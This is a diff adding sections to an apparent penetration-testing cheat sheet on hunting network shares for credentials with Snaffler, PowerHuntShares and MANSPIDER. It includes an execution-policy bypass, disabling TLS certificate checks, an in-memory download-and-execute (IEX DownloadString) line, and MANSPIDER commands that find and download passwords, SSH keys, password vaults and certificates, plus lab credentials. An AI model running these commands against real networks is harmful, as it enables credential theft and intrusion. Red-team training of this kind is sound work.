@@ -3590,10 +3590,244 @@ As a quick reminder, here are some general tips:
 <details>
 <summary><h4>Snaffler</h4></summary>
 
+[Snaffler](https://github.com/SnaffCon/Snaffler) is a C# program that, when run on a domain-joined machine, automatically identifies accessible network shares and searches for interesting files. You can get the lateste executable for Windows [here](https://github.com/SnaffCon/Snaffler/releases).
+
+**Usage**
+
+```cmd
+snaffler.exe -s -o snaffler.log
+```
+```cmd
+snaffler.exe -s -i C:\ -o snaffler.log
+```
+
+| Option | Description | Example/Values |
+|--------|-------------|----------------|
+| `-o`   | Output results to a file | `-o C:\users\thing\snaffler.log` |
+| `-s`   | Enable real-time stdout output | `-s` |
+| `-v`   | Verbosity level | `Trace`, `Debug`, `Info` (default), `Data` |
+| `-m`   | Output directory for copying found files | `-m C:\captured_files` |
+| `-l`   | Max file size to copy (bytes) | Default: `10000000` (10MB) |
+| `-i`   | Disable discovery; requires directory path | `-i \\server\share` |
+| `-n`   | Disable computer discovery; specify hosts | `-n 192.168.1.100` or `-n hosts.txt` |
+| `-y`   | TSV-formatted output | `-y` |
+| `-b`   | Skip LAIM rules (0-3) | `-b 2` (medium filtering) |
+| `-f`   | Find shares via DFS only | `-f` |
+| `-a`   | List shares without file enumeration | `-a` |
+| `-u`   | Pull interesting AD accounts for searches | `-u` |
+| `-d`   | Target domain for computer discovery | `-d inlanefreight.local` |
+| `-c`   | Domain controller for queries | `-c DC01.inlanefreight.local` |
+| `-r`   | Max file size to search (bytes) | Default: `500000` (500KB) |
+| `-j`   | Context bytes around found strings | `-j 200` (200 bytes) |
+| `-z`   | Path to config file | `-z config.toml` or `-z generate` |
+| `-t`   | Log output format | `plain` (default) or `json` |
+| `-x`   | Max threads (minimum 4) | `-x 8` |
+| `-p`   | Custom rules directory (.toml files) | `-p C:\custom_rules` |
+
+> **NOTE:** The real power is in Snaffler's ability to chain multiple rules together, and even create branching chains. This allows us to use "cheap" rules like checking file names and extensions to decide when to use "expensive" rules like running regexen across the contents of files, parsing certs to see whether they contain private keys, etc.
+
+**Rules**
+
+Default Rules:
+
+Snaffler comes with a set of default rules baked into the `.exe`. You can see them in `./Snaffler/SnaffRules/DefaultRules`.
+
+Custom Rules:
+
+*Option 1:* Edit or replace the rules in the `DefaultRules` directory, then build a fresh Snaffler. The `.toml` files in that dir will get baked into the `.exe` as resources, and loaded up at runtime whenever you don't specify any other rules to use.
+
+*Option 2:* Make a directory and stick a bunch of your own rule files in there, then run Snaffler with `-p .\path\to\rules`. Snaffler will parse all the `.toml` files in that directory and use the resulting ruleset. This will also work if you just have them all in one big `.toml` file.
+
 </details>
 
 <details>
 <summary><h4>PowerHuntShares</h4></summary>
+
+Another tool that can be used is [PowerHuntShares](https://github.com/NetSPI/PowerHuntShares), a PowerShell script that doesn't necessarily need to be run on a domain-joined machine. One of its most useful features is that it generates an HTML report upon completion, providing an easy-to-use UI for reviewing the results.
+
+The script can be found in the Github repo or [`here`](../scripts/passwords/PowerHuntShares.psm1).
+
+**Setup Commands**
+
+Below is a list of commands that can be used to load PowerHuntShares into your current PowerShell session. Please note that one of these will have to be run each time you run PowerShell is run. *It is not persistent.*
+
+```powershell
+# Bypass execution policy restrictions
+Set-ExecutionPolicy -Scope Process Bypass
+
+# Import module that exists in the current directory
+Import-Module .\PowerHuntShares.psm1
+```
+
+or 
+
+```powershell
+# Reduce SSL operating level to support connection to github
+[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
+[Net.ServicePointManager]::SecurityProtocol =[Net.SecurityProtocolType]::Tls12
+
+# Download and load PowerHuntShares.psm1 into memory
+IEX(New-Object System.Net.WebClient).DownloadString("https://raw.githubusercontent.com/NetSPI/PowerHuntShares/main/PowerHuntShares.psm1")
+```
+
+**Usage**
+
+> **NOTE:** All commands should be run as an unprivileged domain user.
+
+Run from a domain computer. Performs Active Directory computer discovery by default.
+
+```powershell
+Invoke-HuntSMBShares -Threads 100 -OutputDirectory c:\Users\Public
+```
+
+Run from a domain computer with alternative domain credentials. Performs Active Directory computer discovery by default.
+
+```powershell
+Invoke-HuntSMBShares -Threads 100 -OutputDirectory c:\Users\Public -Credentials domain\user
+```
+
+Run from a domain computer as current user. Target hosts in a file. One per line.
+
+```powershell
+Invoke-HuntSMBShares -Threads 100 -OutputDirectory c:\Users\Public  -HostList c:\temp\hosts.txt
+```
+
+Run from a non-domain computer with credential. Performs Active Directory computer discovery by default.
+
+Get a PowerShell session:
+
+```cmd
+runas /netonly /user:domain\user PowerShell.exe
+```
+
+Setup the script:
+
+```powershell
+Set-ExecutionPolicy -Scope Process Bypass
+Import-Module .\PowerHuntShares.psm1
+```
+
+Execute the tool:
+
+```powershell
+Invoke-HuntSMBShares -Threads 100 -RunSpaceTimeOut 10 -OutputDirectory c:\Users\Public -DomainController 10.1.1.1 -Credential domain\user 
+```
+
+</details>
+
+</details>
+
+<details>
+<summary><h3>Hunting from Linux</h3></summary>
+
+<details>
+<summary><h4>MANSPIDER</h4></summary>
+
+If we don’t have access to a domain-joined computer, or simply prefer to search for files remotely, tools like [MANSPIDER](https://github.com/blacklanternsecurity/MANSPIDER) allow us to scan SMB shares from Linux. It's best to run MANSPIDER using the official Docker container to avoid dependency issues.
+
+**Install**
+
+Pre-requisites:
+
+```bash
+sudo apt install tesseract-ocr && sudo apt install antiword
+```
+
+Tool:
+
+```bash
+pip install pipx
+pipx install git+https://github.com/blacklanternsecurity/MANSPIDER
+```
+
+**Install (using Docker)**
+
+```bash
+docker run --rm -v ./manspider:/root/.manspider blacklanternsecurity/manspider 10.129.234.121 -c 'passw' -u 'mendres' -p 'Inlanefreight2025!'
+```
+
+**Usage**
+
+```bash
+./manspider.sh --help
+```
+
+Example #1: Search the network for filenames that may contain creds
+NOTE: matching files are automatically downloaded into `$HOME/.manspider/loot`! (`-n` to disable)
+
+```bash
+manspider 192.168.0.0/24 -f passw user admin account network login logon cred -d evilcorp -u bob -p Passw0rd
+```
+
+Example #2: Search for spreadsheets with "password" in the filename
+```bash
+manspider share.evilcorp.local -f passw -e xlsx csv -d evilcorp -u bob -p Passw0rd
+```
+
+Example #3: Search for documents containing passwords
+```bash
+manspider share.evilcorp.local -c passw -e xlsx csv docx pdf -d evilcorp -u bob -p Passw0rd
+```
+
+Example #4: Search for interesting file extensions
+```bash
+manspider share.evilcorp.local -e bat com vbs ps1 psd1 psm1 pem key rsa pub reg pfx cfg conf config vmdk vhd vdi dit -d evilcorp -u bob -p Passw0rd
+```
+
+Example #5: Search for finance-related files
+This example searches financy-sounding directories for filenames containing 5 or more consecutive numbers (e.g. `000202006.EFT`)
+```bash
+manspider share.evilcorp.local --dirnames bank financ payable payment reconcil remit voucher vendor eft swift -f '[0-9]{5,}' -d evilcorp -u bob -p Passw0rd
+```
+
+Example #6: Search for SSH keys by filename
+```bash
+manspider share.evilcorp.local -e ppk rsa pem ssh rsa -o -f id_rsa id_dsa id_ed25519 -d evilcorp -u bob -p Passw0rd
+```
+
+Example #7: Search for SSH keys by content
+```bash
+manspider share.evilcorp.local -e '' -c 'BEGIN .{1,10} PRIVATE KEY' -d evilcorp -u bob -p Passw0rd
+```
+
+Example #8: Search for password manager files
+
+| Extension       | Password Manager                          |
+|-----------------|------------------------------------------|
+| `.kdbx`       | KeePass, KeePassXC                       |
+| `.kdb`       | KeePass Classic                          |
+| `.1pif`       | 1Password                                |
+| `.agilekeychain` | 1Password                              |
+| `.opvault`    | 1Password                                |
+| `.lpd`        | LastPass                                 |
+| `.dashlane`   | Dashlane                                 |
+| `.psafe3`     | Password Safe                            |
+| `.enpass`     | Enpass                                   |
+| `.bwdb`       | Bitwarden                                |
+| `.msecure`    | mSecure                                  |
+| `.stickypass` | Sticky Password                          |
+| `.pwm`       | Password Memory                          |
+| `.rdb`        | RoboForm                                 |
+| `.safe`      | SafeInCloud                              |
+| `.zps`       | Zoho Vault                               |
+| `.pmvault`    | SplashID Safe                            |
+| `.mywallet`   | MyWallet                                 |
+| `.jpass`      | JPass                                    |
+| `.pwmdb`     | Universal Password Manager               |
+
+```bash
+manspider share.evilcorp.local -e kdbx kdb 1pif agilekeychain opvault lpd dashlane psafe3 enpass bwdb msecure stickypass pwm rdb safe zps pmvault mywallet jpass pwmdb -d evilcorp -u bob -p Passw0rd
+```
+
+Example #9: Search for certificates
+```bash
+manspider share.evilcorp.local -e pfx p12 pkcs12 pem key crt cer csr jks keystore key keys der -d evilcorp -u bob -p Passw0rd
+```
+
+</details>
+
+<details>
+<summary><h4>NetExec</h4></summary>
 
 </details>
 
